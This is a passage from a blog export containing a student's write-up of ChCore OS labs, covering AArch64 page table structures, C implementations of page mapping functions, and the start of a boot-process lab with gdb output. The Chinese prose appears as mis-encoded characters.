attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            reserved1:<span class="number">4</span>, nT:<span class="number">1</span>, reserved2:<span class="number">13</span>, pfn:<span class="number">18</span>, reserved3:<span class="number">2</span>, GP:<span class="number">1</span>, reserved4:<span class="number">1</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>;	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">    &#125; l1_block;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_table:<span class="number">1</span>, attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            reserved1:<span class="number">4</span>, nT:<span class="number">1</span>, reserved2:<span class="number">4</span>, pfn:<span class="number">27</span>, reserved3:<span class="number">2</span>, GP:<span class="number">1</span>, reserved4:<span class="number">1</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>;	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">    &#125; l2_block;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u64 is_valid:<span class="number">1</span>, is_page:<span class="number">1</span>, attr_index:<span class="number">3</span>,	<span class="comment">// Memory attributes index</span></span><br><span class="line">            NS:<span class="number">1</span>,		<span class="comment">// Non-secure</span></span><br><span class="line">            AP:<span class="number">2</span>,		<span class="comment">// Data access permissions</span></span><br><span class="line">            SH:<span class="number">2</span>,		<span class="comment">// Shareability</span></span><br><span class="line">            AF:<span class="number">1</span>,		<span class="comment">// Accesss flag</span></span><br><span class="line">            nG:<span class="number">1</span>,		<span class="comment">// Not global bit</span></span><br><span class="line">            pfn:<span class="number">36</span>, reserved:<span class="number">3</span>, DBM:<span class="number">1</span>,	<span class="comment">// Dirty bit modifier</span></span><br><span class="line">            Contiguous:<span class="number">1</span>, PXN:<span class="number">1</span>,	<span class="comment">// Privileged execute-never</span></span><br><span class="line">            UXN:<span class="number">1</span>,		<span class="comment">// Execute never</span></span><br><span class="line">            soft_reserved:<span class="number">4</span>, PBHA:<span class="number">4</span>,	<span class="comment">// Page based hardware attributes</span></span><br><span class="line">            ignored:<span class="number">1</span>;</span><br><span class="line">    &#125; l3_page;</span><br><span class="line">    u64 pte;</span><br><span class="line">&#125; <span class="type">pte_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* page_table_page type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">pte_t</span> ent[PTP_ENTRIES];</span><br><span class="line">&#125; <span class="type">ptp_t</span>;</span><br></pre></td></tr></table></figure>

<p><strong>é—®é¢˜ 3</strong></p>
<blockquote>
<ol>
<li>è¯·é—®åœ¨é¡µè¡¨æ¡ç›®ä¸­å¡«å†™çš„ä¸‹ä¸€çº§é¡µè¡¨çš„åœ°å€æ˜¯ç‰©ç†åœ°å€è¿˜æ˜¯è™šæ‹Ÿåœ°å€?</li>
<li>åœ¨ ChCore ä¸­æ£€ç´¢å½“å‰é¡µè¡¨æ¡ç›®çš„æ—¶å€™ï¼Œä½¿ç”¨çš„é¡µè¡¨åŸºåœ°å€æ˜¯è™šæ‹Ÿåœ°å€è¿˜æ˜¯ç‰©ç†åœ°å€ï¼Ÿ</li>
</ol>
</blockquote>
<p>åœ¨é¡µè¡¨æ¡ç›®ä¸­å¡«å†™çš„åœ°å€å‡æ˜¯ç‰©ç†åœ°å€ï¼Œä½†æ˜¯é¡µè¡¨åŸºåœ°å€æ˜¯è™šæ‹Ÿåœ°å€</p>
<p>æœ‰æ—¶éœ€è¦é€šè¿‡ç‰©ç†åœ°å€è¿›è¡Œè¯»å–å’Œä¿®æ”¹å†…å­˜ï¼Œå†…æ ¸å’Œç”¨æˆ·æ€ç¨‹åºéƒ½éœ€è¦è™šæ‹Ÿå†…å­˜è½¬æ¢ï¼ŒChCoreä»è™šæ‹Ÿåœ°å€ 0xFFFFFF00_00000000 å¼€å§‹çº¿æ€§æ˜ å°„ç‰©ç†å†…å­˜ï¼Œå¯ä»¥ç†è§£åŸºäºé¡µè¡¨çš„è™šæ‹Ÿå†…å­˜æœºåˆ¶æ˜¯ä¸ºäº†ä¿è¯è¿›ç¨‹çš„éš”ç¦»æ€§ä¸å†…å­˜çš„åˆ©ç”¨ç‡ï¼Œè€Œå†…æ ¸æ€é¡µè¡¨çš„ä½¿ç”¨æ˜¯ä¸ºäº†å®‰å…¨è®¿é—®</p>
<p><strong>é—®é¢˜ 4</strong></p>
<blockquote>
<ol>
<li>å¦‚æœæˆ‘ä»¬æœ‰ 4G ç‰©ç†å†…å­˜ï¼Œç®¡ç†å†…å­˜éœ€è¦å¤šå°‘ç©ºé—´å¼€é”€? è¿™ä¸ªå¼€é”€æ˜¯å¦‚ä½•é™ä½çš„?</li>
<li>æ€»ç»“ä¸€ä¸‹ x86-64 å’Œ AArch64 åœ°å€ç¿»è¯‘æœºåˆ¶çš„åŒºåˆ«ï¼ŒAArch64 MMUæ¶æ„è®¾è®¡çš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆ?</li>
</ol>
</blockquote>
<p>4G ç‰©ç†å†…å­˜</p>
<ul>
<li>å¦‚æœä¸€çº§é¡µè¡¨ï¼Œæ¯é¡µ 4 Kï¼Œå…±æœ‰ 10^6 é¡µï¼Œæ¯ä¸ªæ¡ç›® 8 å­—èŠ‚ï¼Œéœ€è¦ 8 M</li>
<li>å¦‚æœæ˜¯å¤šçº§é¡µè¡¨ï¼Œ3çº§é¡µè¡¨ 2Mï¼Œ2çº§é¡µè¡¨ 1Gï¼Œ1çº§é¡µè¡¨ 512Gï¼Œéœ€è¦ 4 + 4*512 ï½ 2000 &#x3D; 16K</li>
</ul>
<p>AArch64 åœ°å€ç¿»è¯‘ä½¿ç”¨å†…æ ¸è¿›ç¨‹åŒé¡µè¡¨</p>
<h2 id="é¡µè¡¨ç®¡ç†"><a href="#é¡µè¡¨ç®¡ç†" class="headerlink" title="é¡µè¡¨ç®¡ç†"></a>é¡µè¡¨ç®¡ç†</h2><p>å®éªŒå®ç°é¡µè¡¨ç®¡ç†æœºåˆ¶ï¼ŒåŒ…æ‹¬å››çº§é¡µè¡¨æ’å…¥å’Œåˆ é™¤è™šæ‹Ÿåˆ°ç‰©ç†çš„æ˜ å°„ï¼Œä»¥åŠéœ€è¦æ—¶åˆ›å»ºé¡µè¡¨é¡µ<br><strong>ç»ƒä¹  2</strong></p>
<blockquote>
<p>åœ¨æ–‡ä»¶kernel&#x2F;mm&#x2F;page_tableä¸­ï¼Œå®ç°map_range_in_pgtbl()ï¼Œunmap_range_in_pgtbl()å’Œquery_in_pgtbl() ã€‚å¯ä»¥è°ƒç”¨è¾…åŠ©å‡½æ•°ï¼šset_pte_flags(),get_next_ptp(),flush_tlb()ã€‚</p>
</blockquote>
<p>é¦–å…ˆå¯¹è¾…åŠ©å‡½æ•°è¿›è¡Œåˆ†æ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * the 3rd arg means the kind of PTE.</span><br><span class="line"> */</span><br><span class="line"> // æ ¹æ®ç±»å‹å’Œæ ‡è¯†ä½è®¾ç½® é¡µçš„å±æ€§</span><br><span class="line">static int set_pte_flags(pte_t * entry, vmr_prop_t flags, int kind)</span><br><span class="line">&#123;</span><br><span class="line">    if (flags &amp; VMR_WRITE)</span><br><span class="line">        entry-&gt;l3_page.AP = AARCH64_PTE_AP_HIGH_RW_EL0_RW;</span><br><span class="line">    else</span><br><span class="line">        entry-&gt;l3_page.AP = AARCH64_PTE_AP_HIGH_RO_EL0_RO;</span><br><span class="line"></span><br><span class="line">    if (flags &amp; VMR_EXEC)</span><br><span class="line">        entry-&gt;l3_page.UXN = AARCH64_PTE_UX;</span><br><span class="line">    else</span><br><span class="line">        entry-&gt;l3_page.UXN = AARCH64_PTE_UXN;</span><br><span class="line"></span><br><span class="line">    // EL1 cannot directly execute EL0 accessiable region.</span><br><span class="line">    if (kind == USER_PTE)</span><br><span class="line">        entry-&gt;l3_page.PXN = AARCH64_PTE_PXN;</span><br><span class="line">    entry-&gt;l3_page.AF = AARCH64_PTE_AF_ACCESSED;</span><br><span class="line"></span><br><span class="line">    // inner sharable</span><br><span class="line">    entry-&gt;l3_page.SH = INNER_SHAREABLE;</span><br><span class="line">    // memory type</span><br><span class="line">    entry-&gt;l3_page.attr_index = NORMAL_MEMORY;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Find next page table page for the &quot;va&quot;.</span><br><span class="line"> */ ä¸ºè™šæ‹Ÿåœ°å€ va æŸ¥æ‰¾ä¸‹ä¸€çº§é¡µç™½é¡µï¼Œç»™å®šå½“å‰é¡µè¡¨åŠå±‚çº§ï¼Œè¿”å›ä¸‹ä¸€çº§é¡µè¡¨ï¼Œå¦‚æœç¼ºå¤±åˆ™è¿›è¡Œåˆ†é…</span><br><span class="line">static int get_next_ptp(ptp_t * cur_ptp, u32 level, vaddr_t va,</span><br><span class="line">			ptp_t ** next_ptp, pte_t ** pte, bool alloc)</span><br><span class="line">&#123;</span><br><span class="line">    u32 index = 0;</span><br><span class="line">    pte_t *entry;</span><br><span class="line"></span><br><span class="line">    if (cur_ptp == NULL)</span><br><span class="line">        return -ENOMAPPING;</span><br><span class="line">    // æ ¹æ®å±‚çº§è·å– va åœ¨è¯¥å±‚çº§çš„ç´¢å¼•å·</span><br><span class="line">    switch (level) &#123;</span><br><span class="line">    case 0:</span><br><span class="line">        index = GET_L0_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 1:</span><br><span class="line">        index = GET_L1_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        index = GET_L2_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        index = GET_L3_INDEX(va);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        BUG_ON(1);</span><br><span class="line">    &#125;</span><br><span class="line">    // è·å–å…¥å£é¡¹çš„åœ°å€</span><br><span class="line">    entry = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line">    if (IS_PTE_INVALID(entry-&gt;pte)) &#123;</span><br><span class="line">        if (alloc == false) &#123;</span><br><span class="line">            return -ENOMAPPING;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* alloc a new page table page */</span><br><span class="line">            ptp_t *new_ptp;</span><br><span class="line">            paddr_t new_ptp_paddr;</span><br><span class="line">            pte_t new_pte_val;</span><br><span class="line">            // åˆ†é…å•ä¸ªç‰©ç†é¡µä½œä¸ºæ–°çš„é¡µè¡¨é¡µ</span><br><span class="line">            new_ptp = get_pages(0);</span><br><span class="line">            BUG_ON(new_ptp == NULL);</span><br><span class="line">            memset((void *)new_ptp, 0, PAGE_SIZE);</span><br><span class="line">            // è·å–ç‰©ç†åœ°å€å¹¶è®¾ç½®å±æ€§ä¸ºé¡µè¡¨ table</span><br><span class="line">            new_ptp_paddr = virt_to_phys((vaddr_t) new_ptp);</span><br><span class="line"></span><br><span class="line">            new_pte_val.pte = 0;</span><br><span class="line">            new_pte_val.table.is_valid = 1;</span><br><span class="line">            new_pte_val.table.is_table = 1;</span><br><span class="line">            new_pte_val.table.next_table_addr</span><br><span class="line">                = new_ptp_paddr &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">            /* same effect as: cur_ptp-&gt;ent[index] = new_pte_val; */</span><br><span class="line">            entry-&gt;pte = new_pte_val.pte;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // è½¬æ¢ä¸ºè™šæ‹Ÿåœ°å€</span><br><span class="line">    *next_ptp = (ptp_t *) GET_NEXT_PTP(entry);</span><br><span class="line">    *pte = entry;</span><br><span class="line">    if (IS_PTE_TABLE(entry-&gt;pte))</span><br><span class="line">        return NORMAL_PTP;</span><br><span class="line">    else</span><br><span class="line">        return BLOCK_PTP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåœ¨è·å¾—é¡µè¡¨çš„åŸºç¡€ä¸Šï¼Œå®ç° query_in_pgtbl()ï¼Œå®Œæˆè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢ï¼Œå¹¶è¿”å›ç›¸å…³é¡µè¡¨å…¥å£</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Translate a va to pa, and get its pte for the flags</span><br><span class="line"> */</span><br><span class="line">/*</span><br><span class="line"> * query_in_pgtbl: translate virtual address to physical </span><br><span class="line"> * address and return the corresponding page table entry</span><br><span class="line"> * </span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ query virtual address</span><br><span class="line"> * pa @ return physical address</span><br><span class="line"> * entry @ return page table entry</span><br><span class="line"> * </span><br><span class="line"> * Hint: check the return value of get_next_ptp, if ret == BLOCK_PTP</span><br><span class="line"> * return the pa and block entry immediately</span><br><span class="line"> */</span><br><span class="line">int query_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, paddr_t * pa, pte_t ** entry)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">    ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">	ptp_t *next_ptp = NULL;</span><br><span class="line">	pte_t *next_pte = NULL;</span><br><span class="line"></span><br><span class="line">	int level = 0;</span><br><span class="line">	int err = 0;</span><br><span class="line">	while (level &lt;= 3 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, false)) == NORMAL_PTP)</span><br><span class="line">	&#123;</span><br><span class="line">		cur_ptp = next_ptp;</span><br><span class="line">		level++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (err == NORMAL_PTP)</span><br><span class="line">	&#123;</span><br><span class="line">		if (level != 4)&#123;</span><br><span class="line">			kwarn(&quot;query_in_pgtbl: level = %d &lt; 4\n&quot;, level);</span><br><span class="line">			return -ENOMAPPING;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!next_pte-&gt;l3_page.is_valid || !next_pte-&gt;l3_page.is_page)&#123;</span><br><span class="line">			return -ENOMAPPING;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		*pa = virt_to_phys((vaddr_t)next_ptp) + GET_VA_OFFSET_L3(va);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else if(err &lt; 0)&#123;</span><br><span class="line">		return err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else &#123;</span><br><span class="line">		kwarn(&quot;query_in_pgtbl: show never be here\n&quot;);</span><br><span class="line">		return err;</span><br><span class="line">	&#125;</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ˜¯æ˜ å°„ä¸å–æ¶ˆæ˜ å°„æ“ä½œï¼Œå¯¹äºæ˜ å°„æ¥è¯´ï¼Œå°±æ˜¯å°†ç‰©ç†é¡µé¢ä¸è™šæ‹Ÿé¡µé¢å¯¹åº”èµ·æ¥ï¼Œæ–°å»ºé¡µè¡¨å¯ä»¥å€ŸåŠ© get_next_ptp çš„ alloc å®ç°ï¼Œä»¥åˆ›å»ºå¤šçº§é¡µè¡¨é¡¹ï¼Œæœ€åä¸€çº§é¡µé¡¹å‚è€ƒ alloc å®ç°å¹¶è®¾ç½®å‚æ•°ï¼Œå¯¹äºå–æ¶ˆæ˜ å°„è€Œè¨€ï¼Œç›´æ¥è§£é™¤æ˜ å°„å…³ç³»ï¼Œç›´æ¥å°† pte æ¸…é›¶å³å¯</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * map_range_in_pgtbl: map the virtual address [va:va+size] to </span><br><span class="line"> * physical address[pa:pa+size] in given pgtbl</span><br><span class="line"> *</span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ start virtual address</span><br><span class="line"> * pa @ start physical address</span><br><span class="line"> * len @ mapping size</span><br><span class="line"> * flags @ corresponding attribution bit</span><br><span class="line"> *</span><br><span class="line"> * Hint: In this function you should first invoke the get_next_ptp()</span><br><span class="line"> * to get the each level page table entries. Read type pte_t carefully</span><br><span class="line"> * and it is convenient for you to call set_pte_flags to set the page</span><br><span class="line"> * permission bit. Don&#x27;t forget to call flush_tlb at the end of this function </span><br><span class="line"> */</span><br><span class="line">int map_range_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, paddr_t pa,</span><br><span class="line">		       size_t len, vmr_prop_t flags)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">	for (const vaddr_t end_va = va + len; va &lt; end_va; va+= PAGE_SIZE)</span><br><span class="line">	&#123;</span><br><span class="line">		ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">		ptp_t * next_ptp = NULL;</span><br><span class="line">		pte_t * next_pte = NULL;</span><br><span class="line">		int level = 0;</span><br><span class="line">		int err = 0;</span><br><span class="line"></span><br><span class="line">		while (level &lt;= 2 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, true)) == NORMAL_PTP)</span><br><span class="line">		&#123;</span><br><span class="line">			cur_ptp = next_ptp;</span><br><span class="line">			level++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		u32 index = GET_L3_INDEX(va);</span><br><span class="line">		next_pte = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.is_valid = 1;</span></span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.is_page = 1;</span></span><br><span class="line"><span class="meta prompt_">		next_pte-&gt;</span><span class="language-bash">l3_page.pfn = pa &gt;&gt; PAGE_SHIFT;</span></span><br><span class="line">		set_pte_flags(next_pte, flags, KERNEL_PTE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flush_tlb();</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * unmap_range_in_pgtble: unmap the virtual address [va:va+len]</span><br><span class="line"> * </span><br><span class="line"> * pgtbl @ ptr for the first level page table(pgd) virtual address</span><br><span class="line"> * va @ start virtual address</span><br><span class="line"> * len @ unmapping size</span><br><span class="line"> * </span><br><span class="line"> * Hint: invoke get_next_ptp to get each level page table, don&#x27;t </span><br><span class="line"> * forget the corner case that the virtual address is not mapped.</span><br><span class="line"> * call flush_tlb() at the end of function</span><br><span class="line"> * </span><br><span class="line"> */</span><br><span class="line">int unmap_range_in_pgtbl(vaddr_t * pgtbl, vaddr_t va, size_t len)</span><br><span class="line">&#123;</span><br><span class="line">	// &lt;lab2&gt;</span><br><span class="line">	for (const vaddr_t end_va = va + len; va &lt; end_va; va+= PAGE_SIZE)</span><br><span class="line">	&#123;</span><br><span class="line">		ptp_t * cur_ptp = (ptp_t *) pgtbl;</span><br><span class="line">		ptp_t * next_ptp = NULL;</span><br><span class="line">		pte_t * next_pte = NULL;</span><br><span class="line">		int level = 0;</span><br><span class="line">		int err = 0;</span><br><span class="line"></span><br><span class="line">		while (level &lt;= 2 &amp;&amp; (err = get_next_ptp(cur_ptp, level, va, &amp;next_ptp, &amp;next_pte, false)) == NORMAL_PTP)</span><br><span class="line">		&#123;</span><br><span class="line">			cur_ptp = next_ptp;</span><br><span class="line">			level++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (err == NORMAL_PTP &amp;&amp; level == 3 &amp;&amp; cur_ptp != NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			u32 index = GET_L3_INDEX(va);</span><br><span class="line">			next_pte = &amp;(cur_ptp-&gt;ent[index]);</span><br><span class="line"><span class="meta prompt_">			next_pte-&gt;</span><span class="language-bash">pte = 0;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flush_tlb();</span><br><span class="line">	// &lt;/lab2&gt;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="å†…æ ¸åœ°å€ç©ºé—´"><a href="#å†…æ ¸åœ°å€ç©ºé—´" class="headerlink" title="å†…æ ¸åœ°å€ç©ºé—´"></a>å†…æ ¸åœ°å€ç©ºé—´</h1><p><strong>é—®é¢˜ 5</strong></p>
<blockquote>
<p>åœ¨ AArch64 MMU æ¶æ„ä¸­ï¼Œä½¿ç”¨äº†ä¸¤ä¸ª TTBR å¯„å­˜å™¨ï¼ŒChCore ä½¿ç”¨ä¸€ä¸ª TTBR å¯„å­˜å™¨æ˜ å°„å†…æ ¸åœ°å€ç©ºé—´ï¼Œå¦ä¸€ä¸ªå¯„å­˜å™¨æ˜ å°„ç”¨æˆ·æ€çš„åœ°å€ç©ºé—´ï¼Œé‚£ä¹ˆæ˜¯å¦è¿˜éœ€è¦é€šè¿‡è®¾ç½®é¡µè¡¨ä½çš„å±æ€§æ¥éš”ç¦»å†…æ ¸æ€å’Œç”¨æˆ·æ€çš„åœ°å€ç©ºé—´?</p>
</blockquote>
<p>é€šè¿‡è®¾ç½®å±æ€§å¯ä»¥é…ç½®å†…æ ¸æ€æ— æ³•è®¿é—®ç”¨æˆ·æ€çš„åœ°å€ç©ºé—´ï¼Œé˜²æ­¢å†…æ ¸æ¼æ´ SMEP SMAP</p>
<p><strong>é—®é¢˜ 6</strong></p>
<blockquote>
<ol>
<li>ChCore ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å—æ¡ç›®ç»„ç»‡å†…æ ¸å†…å­˜? å“ªäº›è™šæ‹Ÿåœ°å€ç©ºé—´åœ¨ Boot é˜¶æ®µå¿…é¡»æ˜ å°„ï¼Œå“ªäº›è™šæ‹Ÿåœ°å€ç©ºé—´å¯ä»¥åœ¨å†…æ ¸å¯åŠ¨åå»¶è¿Ÿ?</li>
</ol>
</blockquote>
<p>ç›¸æ¯”ç”¨æˆ·æ€å†…å­˜ï¼Œå†…æ ¸æ€å†…å­˜çš„è®¿é—®é¢‘ç‡è¾ƒé«˜ï¼Œä½¿ç”¨å¤§é¡µ TLB miss ä¼šå‡å°‘ï¼Œå¸¦æ¥æ€§èƒ½çš„æå‡<br>å†…æ ¸æ¨¡å—åœ°å€åœ¨ Boot é˜¶æ®µéœ€è¦æ˜ å°„ï¼Œå†…æ ¸å¯åŠ¨åçš„æ–‡ä»¶ç³»ç»Ÿã€è¿›ç¨‹è°ƒåº¦ç­‰æ¨¡å—å¯ä»¥å»¶è¿Ÿå¯åŠ¨</p>
<blockquote>
<ol start="2">
<li>ä¸ºä»€ä¹ˆç”¨æˆ·ç¨‹åºä¸èƒ½è¯»å†™å†…æ ¸å†…å­˜? ä¿æŠ¤å†…æ ¸å†…å­˜çš„å…·ä½“æœºåˆ¶æ˜¯ä»€ä¹ˆ?</li>
</ol>
</blockquote>
<p>åœ¨è®¿é—®å†…æ ¸å†…å­˜æ—¶ï¼Œä½¿ç”¨ç¨‹åºæ ‡å¿—å¯„å­˜å™¨ä»¥åŠé¡µè¡¨é¡¹æ ‡å¿—è¿›è¡Œæ£€æµ‹</p>
<p><strong>ç»ƒä¹  3</strong></p>
<blockquote>
<p>å®Œå–„kernel&#x2F;mm&#x2F;mm.cä¸­çš„map_kernel_space()å‡½æ•°ï¼Œå®ç°å¯¹å†…æ ¸ç©ºé—´çš„æ˜ å°„ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡kernel_space_check()çš„æ£€æŸ¥ã€‚</p>
</blockquote>
<p>ç›´æ¥è°ƒç”¨å‰é¢å†™çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">map_kernel_space</span><span class="params">(<span class="type">vaddr_t</span> va, <span class="type">paddr_t</span> pa, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &lt;lab2&gt;</span></span><br><span class="line">    <span class="type">vaddr_t</span> *ttbr1 = (<span class="type">vaddr_t</span> *)get_ttbr1();</span><br><span class="line">    map_range_in_pgtbl(ttbr1, va, pa, len, KERNEL_PT);</span><br><span class="line">    <span class="comment">// &lt;/lab2&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Kernel</category>
        <category>ARM</category>
      </categories>
      <tags>
        <tag>AArch64</tag>
      </tags>
  </entry>
  <entry>
    <title>ChCore Lab1 æœºå™¨å¯åŠ¨</title>
    <url>/2022/05/26/ChCore-Lab1-%E6%9C%BA%E5%99%A8%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="å®éªŒåŸºæœ¬çŸ¥è¯†"><a href="#å®éªŒåŸºæœ¬çŸ¥è¯†" class="headerlink" title="å®éªŒåŸºæœ¬çŸ¥è¯†"></a>å®éªŒåŸºæœ¬çŸ¥è¯†</h1><h2 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹  2"></a>ç»ƒä¹  2</h2><blockquote>
<p>å¯åŠ¨å¸¦è°ƒè¯•çš„ QEMUï¼Œä½¿ç”¨ GDB çš„whereå‘½ä»¤æ¥è·Ÿè¸ªå…¥å£ï¼ˆç¬¬ä¸€ä¸ªå‡½<br>æ•°ï¼‰åŠ bootloader çš„åœ°å€ã€‚</p>
</blockquote>
<p>å¯åŠ¨ä¹‹åå¯ä»¥çœ‹åˆ°è·Ÿè¸ªå…¥å£åœ°å€ï¼Œå…¶æ–‡ä»¶è·¯å¾„ä¸º <code>/boot/Start.S</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">0x0000000000080000 in ?? ()</span><br><span class="line">(gdb) where</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x0000000000080000 <span class="keyword">in</span> _start ()</span></span><br></pre></td></tr></table></figure>

<h1 id="å†…æ ¸çš„å¼•å¯¼ä¸åŠ è½½"><a href="#å†…æ ¸çš„å¼•å¯¼ä¸åŠ è½½" class="headerlink" title="å†…æ ¸çš„å¼•å¯¼ä¸åŠ è½½"></a>å†…æ ¸çš„å¼•å¯¼ä¸åŠ è½½</h1><p>æ­¤ bootloader ç¨‹åºå­˜åœ¨äº .img é•œåƒï¼Œå³ä¸ºå†…æ ¸è‡ªå¸¦çš„ bootloaderï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯</p>
<ul>
<li>é€šè¿‡å‡½æ•° arm64_elX_to_el1 å°†å¤„ç†å™¨å¼‚å¸¸çº§åˆ«åˆ‡æ¢åˆ° EL1</li>
<li>åˆå§‹åŒ–å¼•å¯¼ UARTã€é¡µè¡¨å’Œ MMUï¼Œéšåè·³è½¬åˆ°å®é™…å†…æ ¸</li>
</ul>
<h2 id="å¤„ç†å™¨å¼‚å¸¸çº§åˆ«"><a href="#å¤„ç†å™¨å¼‚å¸¸çº§åˆ«" class="headerlink" title="å¤„ç†å™¨å¼‚å¸¸çº§åˆ«"></a>å¤„ç†å™¨å¼‚å¸¸çº§åˆ«</h2><p>AArch64 é€šå¸¸é‡‡ç”¨ 4 å±‚å®‰å…¨æ¨¡å‹ï¼Œæˆ‘ä»¬å¯¹ arm64_elX_to_el1 å‡½æ•°è¿›è¡Œç®€å•åˆ†æ</p>
